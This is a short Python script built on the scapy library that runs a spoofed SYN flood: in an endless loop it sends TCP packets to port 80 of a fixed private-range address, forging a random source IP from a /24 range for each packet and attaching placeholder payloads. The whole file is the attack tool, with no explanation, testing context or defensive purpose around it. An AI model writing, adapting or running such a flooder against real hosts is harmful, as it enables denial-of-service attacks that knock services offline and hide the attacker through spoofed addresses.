#!/usr/bin/env python

from scapy.all import *
import random
import ipaddress

def syn_flood(source_ip, target_ip, raw_data):
    dport = 80
    ip_layer = IP(src=source_ip, dst=target_ip)
    tcp_layer = TCP(sport=5555, dport=dport)
    raw_layer_data = Raw(load=raw_data)
    packet = ip_layer / tcp_layer / raw_layer_data
    send(packet)

target_ip = "192.168.30.137"
raw_data_list = ["Payload 1", "Payload 2", "Payload 3"]  # List of different payloads

ip_range = ipaddress.IPv4Network("192.168.30.0/24")  # IP range to choose source IP addresses from

while True:
    source_ip = str(ipaddress.IPv4Address(random.randint(int(ip_range.network_address), int(ip_range.broadcast_address))))
    raw_data = random.choice(raw_data_list)
    syn_flood(source_ip, target_ip, raw_data)
